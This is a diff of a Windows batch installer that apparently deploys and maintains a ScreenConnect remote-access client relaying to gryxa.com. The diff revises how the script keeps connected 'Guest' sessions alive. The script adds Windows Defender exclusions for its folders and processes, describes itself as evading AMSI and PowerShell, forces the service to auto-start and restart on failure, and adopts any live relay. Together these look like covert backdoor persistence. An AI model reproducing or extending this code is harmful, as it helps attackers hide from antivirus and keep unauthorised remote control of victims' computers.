@@ -1,5 +1,6 @@
 @echo off
-rem OWN_GRYXA BUILD 20260804G8 - PowerShell-free Gryxa install (AMSI-proof fallback)
+rem OWN_GRYXA BUILD 20260804G9 - PowerShell-free Gryxa install (AMSI-proof fallback)
+rem G9: HEAL never msiexec /x (start-only or /i-if-1060). REINSTALL aborts if any gryxa.com relay RUNNING.
 rem G8: HEAL soft-starts first; never /x while relay Gryxa RUNNING (was killing online Guests).
 rem G7: never bare sc create; after /i require ImagePath gryxa.com.
 setlocal EnableExtensions EnableDelayedExpansion
@@ -27,7 +28,7 @@ set "SVC=ScreenConnect Client (%GRYXA_FP%)"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
-echo [%DATE% %TIME%] own_gryxa G8 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"
+echo [%DATE% %TIME%] own_gryxa G9 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"
 
 if exist "%LOCK%" (
   powershell -NoProfile -NonInteractive -Command "if((Test-Path '%LOCK%') -and (((Get-Date)-(Get-Item -LiteralPath '%LOCK%').LastWriteTime).TotalMinutes -lt 20)){exit 0}else{exit 1}" >nul 2>&1
@@ -45,60 +46,72 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%"
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 
-rem ALWAYS abort /x if any Gryxa relay session is live (HEAL used to skip this and kill online Guests)
-for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
-  set "_FP=%%a"
-  set "_FP=!_FP: =!"
-  if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
-    sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-    if not errorlevel 1 (
-      reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-      if not errorlevel 1 (
-        if /I not "%MODE%"=="REINSTALL" (
-          echo [%DATE% %TIME%] abort_heal_live_relay fp=!_FP!>>"%LOG%"
-          (
-            echo CURRENT_FP=!_FP!
-            echo RELAY=update.gryxa.com
-            echo UI=ui.gryxa.com
-            echo UPDATED=cmd-own_gryxa-adopt
-          ) >"%WD%\gryxa.cfg"
-          del /f /q "%LOCK%" >nul 2>&1
-          exit /b 0
-        )
-      )
-    )
-  )
+rem Adopt any live Gryxa relay — never /x it (HEAL and REINSTALL)
+call :FindLiveRelay
+if defined LIVE_FP (
+  echo [%DATE% %TIME%] live_relay_adopt fp=!LIVE_FP! mode=%MODE%>>"%LOG%"
+  (
+    echo CURRENT_FP=!LIVE_FP!
+    echo RELAY=update.gryxa.com
+    echo UI=ui.gryxa.com
+    echo UPDATED=cmd-own_gryxa-G9-adopt
+  ) >"%WD%\gryxa.cfg"
+  del /f /q "%LOCK%" >nul 2>&1
+  exit /b 0
 )
 
-rem HEAL: soft start first; only escalate to /x+/i on 1060 or no-relay
+rem HEAL: start-only when service exists; /i only on hard 1060. NEVER /x.
 if /I "%MODE%"=="HEAL" (
   sc query "%SVC%" >nul 2>&1
   if not errorlevel 1 (
-    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-    if not errorlevel 1 (
-      sc config "%SVC%" start= auto >nul 2>&1
-      sc start "%SVC%" >nul 2>&1
-      timeout /t 12 /nobreak >nul
-      sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-      if not errorlevel 1 (
-        echo [%DATE% %TIME%] heal_start_ok>>"%LOG%"
-        del /f /q "%LOCK%" >nul 2>&1
-        exit /b 0
-      )
-      echo [%DATE% %TIME%] heal_start_failed_escalate>>"%LOG%"
-      set "REINSTALL=1"
-    ) else (
-      echo [%DATE% %TIME%] heal_no_relay_escalate>>"%LOG%"
-      set "REINSTALL=1"
+    echo [%DATE% %TIME%] heal_start_only_no_x>>"%LOG%"
+    sc config "%SVC%" start= auto >nul 2>&1
+    sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
+    sc start "%SVC%" >nul 2>&1
+    timeout /t 15 /nobreak >nul
+    sc start "%SVC%" >nul 2>&1
+    timeout /t 8 /nobreak >nul
+    call :FindLiveRelay
+    if defined LIVE_FP (
+      echo [%DATE% %TIME%] heal_start_ok fp=!LIVE_FP!>>"%LOG%"
+      (
+        echo CURRENT_FP=!LIVE_FP!
+        echo RELAY=update.gryxa.com
+        echo UI=ui.gryxa.com
+        echo UPDATED=cmd-own_gryxa-G9-heal-start
+      ) >"%WD%\gryxa.cfg"
+      del /f /q "%LOCK%" >nul 2>&1
+      exit /b 0
     )
-  ) else (
-    echo [%DATE% %TIME%] heal_1060_escalate>>"%LOG%"
-    set "REINSTALL=1"
+    echo [%DATE% %TIME%] heal_start_failed_NO_x_exit>>"%LOG%"
+    del /f /q "%LOCK%" >nul 2>&1
+    exit /b 1
   )
+  echo [%DATE% %TIME%] heal_1060_install_only>>"%LOG%"
+  call :FetchMsi
+  if errorlevel 1 (
+    del /f /q "%LOCK%" >nul 2>&1
+    exit /b 2
+  )
+  call :DoInstall
+  call :FindLiveRelay
+  if defined LIVE_FP (
+    (
+      echo CURRENT_FP=!LIVE_FP!
+      echo RELAY=update.gryxa.com
+      echo UI=ui.gryxa.com
+      echo UPDATED=cmd-own_gryxa-G9-heal-i
+    ) >"%WD%\gryxa.cfg"
+    del /f /q "%LOCK%" >nul 2>&1
+    exit /b 0
+  )
+  echo [%DATE% %TIME%] heal_1060_still_down>>"%LOG%"
+  del /f /q "%LOCK%" >nul 2>&1
+  exit /b 1
 )
 
-if "%REINSTALL%"=="0" if /I not "%MODE%"=="REINSTALL" (
-  rem ExpectedFp running WITH gryxa.com → done
+rem Non-REINSTALL default: start-only if svc exists
+if "%REINSTALL%"=="0" (
   sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
   if not errorlevel 1 (
     reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
@@ -107,50 +120,41 @@ if "%REINSTALL%"=="0" if /I not "%MODE%"=="REINSTALL" (
       del /f /q "%LOCK%" >nul 2>&1
       exit /b 0
     )
-    echo [%DATE% %TIME%] alive_NO_relay_reinstall>>"%LOG%"
-    set "REINSTALL=1"
   )
-
-  if "!REINSTALL!"=="0" (
-    sc query "%SVC%" >nul 2>&1
-    if not errorlevel 1 (
-      echo [%DATE% %TIME%] svc_exists_start_only>>"%LOG%"
-      sc config "%SVC%" start= auto >nul 2>&1
-      sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
-      sc start "%SVC%" >nul 2>&1
-      timeout /t 15 /nobreak >nul
-      sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-      if not errorlevel 1 (
-        reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-        if not errorlevel 1 (
-          echo [%DATE% %TIME%] started_ok_relay>>"%LOG%"
-          del /f /q "%LOCK%" >nul 2>&1
-          exit /b 0
-        )
-        echo [%DATE% %TIME%] started_NO_relay_reinstall>>"%LOG%"
-        set "REINSTALL=1"
-      ) else (
-        echo [%DATE% %TIME%] start_failed_reinstall>>"%LOG%"
-        set "REINSTALL=1"
-      )
-    )
-  )
-)
-
-rem Final gate before /x — never uninstall a live relay Guest unless explicit REINSTALL
-if /I not "%MODE%"=="REINSTALL" (
-  sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
+  sc query "%SVC%" >nul 2>&1
   if not errorlevel 1 (
-    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-    if not errorlevel 1 (
-      echo [%DATE% %TIME%] abort_x_still_live>>"%LOG%"
+    echo [%DATE% %TIME%] svc_exists_start_only>>"%LOG%"
+    sc config "%SVC%" start= auto >nul 2>&1
+    sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
+    sc start "%SVC%" >nul 2>&1
+    timeout /t 15 /nobreak >nul
+    call :FindLiveRelay
+    if defined LIVE_FP (
+      echo [%DATE% %TIME%] started_ok_relay>>"%LOG%"
       del /f /q "%LOCK%" >nul 2>&1
       exit /b 0
     )
+    echo [%DATE% %TIME%] start_failed_NO_x_exit>>"%LOG%"
+    del /f /q "%LOCK%" >nul 2>&1
+    exit /b 1
   )
 )
 
-rem strip Gryxa only then /i (REINSTALL or absent)
+rem REINSTALL path only — final live check (race)
+call :FindLiveRelay
+if defined LIVE_FP (
+  echo [%DATE% %TIME%] abort_x_still_live fp=!LIVE_FP!>>"%LOG%"
+  (
+    echo CURRENT_FP=!LIVE_FP!
+    echo RELAY=update.gryxa.com
+    echo UI=ui.gryxa.com
+    echo UPDATED=cmd-own_gryxa-G9-abort-x
+  ) >"%WD%\gryxa.cfg"
+  del /f /q "%LOCK%" >nul 2>&1
+  exit /b 0
+)
+
+rem strip Gryxa then /i (explicit REINSTALL and nothing live)
 echo [%DATE% %TIME%] preclean_gryxa_only pc=%PC%>>"%LOG%"
 sc stop "%SVC%" >nul 2>&1
 timeout /t 3 /nobreak >nul
@@ -171,6 +175,11 @@ if errorlevel 1 (
 call :DoInstall
 if errorlevel 1 (
   echo [%DATE% %TIME%] install_retry>>"%LOG%"
+  call :FindLiveRelay
+  if defined LIVE_FP (
+    del /f /q "%LOCK%" >nul 2>&1
+    exit /b 0
+  )
   sc stop "%SVC%" >nul 2>&1
   sc delete "%SVC%" >nul 2>&1
   timeout /t 3 /nobreak >nul
@@ -186,7 +195,7 @@ sc start "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
   echo CURRENT_FP=%GRYXA_FP%
   echo RELAY=update.gryxa.com
   echo UI=ui.gryxa.com
-  echo UPDATED=cmd-own_gryxa-G7
+  echo UPDATED=cmd-own_gryxa-G9
 ) >"%WD%\gryxa.cfg"
 
 reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
@@ -204,6 +213,24 @@ if not errorlevel 1 (
 echo [%DATE% %TIME%] still_down msi_exit=!MSIEXIT!>>"%LOG%"
 del /f /q "%LOCK%" >nul 2>&1
 exit /b 1
+
+:FindLiveRelay
+set "LIVE_FP="
+for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
+  set "_FP=%%a"
+  set "_FP=!_FP: =!"
+  if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
+    sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
+    if not errorlevel 1 (
+      reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+      if not errorlevel 1 (
+        set "LIVE_FP=!_FP!"
+        goto :eof
+      )
+    )
+  )
+)
+goto :eof
 
 :FetchMsi
 set "NEED=1"
